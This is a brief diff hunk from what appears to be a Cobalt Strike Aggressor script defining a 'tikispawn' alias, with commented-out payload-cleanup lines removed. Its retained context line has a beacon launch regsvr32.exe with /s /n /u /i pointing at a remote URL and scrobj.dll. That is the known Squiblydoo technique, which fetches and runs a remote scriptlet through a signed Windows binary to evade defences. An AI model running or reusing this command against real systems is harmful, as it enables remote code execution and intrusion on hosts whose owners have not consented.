@@ -173,13 +173,6 @@ alias tikispawn {
 		beacon_execute_job($bid, "C:\\Windows\\System32\\regsvr32.exe", " /s /n /u /i:\" $+ $url $+ \" scrobj.dll", 0);
 	}
 
-	###################
-	### Remove Site ###
-	###################
-
-	#bpause($bid, 10000);
-	#remove_payload($port, $uri);
-
 }
 
 alias tikispawnas {
